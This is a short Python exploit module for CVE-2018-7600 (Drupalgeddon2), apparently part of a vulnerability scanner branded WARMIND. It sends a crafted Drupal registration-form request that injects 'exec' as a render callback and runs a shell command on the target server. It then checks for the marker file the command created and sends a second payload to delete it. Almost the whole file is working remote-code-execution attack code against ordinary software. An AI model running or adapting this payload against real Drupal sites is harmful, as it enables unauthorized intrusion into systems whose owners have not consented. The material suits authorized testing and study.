import requests


class ExploitFailed(Exception): pass


class CleanUpFailure(Exception): pass


def exploit(target, **kwargs):

    def random_filename():
        import random
        import string

        retval = []
        length = 5
        for _ in range(length):
            retval.append(random.choice(string.ascii_letters))
        return "{}.txt".format(''.join(retval))

    proxy = kwargs.get("proxy", None)
    headers = kwargs.get("headers", None)

    exploit_info = {
        "cve": "CVE-2018-7600",
        "information": "",  # TODO:/
        "discoverer": "Jasper Mattsson"
    }

    filename = random_filename()
    shell_code = "echo 'Brought to you by WARMIND' | tee {}".format(filename)
    target_append = "?q=user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    target_post = {
        'form_id': 'user_register_form', '_drupal_ajax': '1',
        'mail[#post_render][]': 'exec', 'mail[#type]': 'markup',
        'mail[#markup]': shell_code
    }
    url = "{}/{}".format(target, target_append)
    print url
    req = requests.post(url, proxies=proxy, headers=headers, data=target_post)
    status_code = req.status_code
    if status_code != 200:
        raise ExploitFailed("received invalid status code: {}".format(status_code))
    else:
        verification_url = "{}/{}".format(target, filename)
        req = requests.get(verification_url, headers=headers, proxies=proxy)
        if "WARMIND" in req.content:
            print("exploit succeeded cleaning up")
            clean_up_post = {
               'form_id': 'user_register_form', '_drupal_ajax': '1',
               'mail[#post_render][]': 'exec', 'mail[#type]': 'markup',
               'mail[#markup]': "rm {}".format(filename)
            }
            url = "{}/{}".format(target, target_append)
            req = requests.post(url, proxy=proxy, headers=headers, data=clean_up_post)
            status_code = req.status_code
            if status_code != 200:
                raise CleanUpFailure("failed to clean file: {}".format(filename))
            else:
                return True


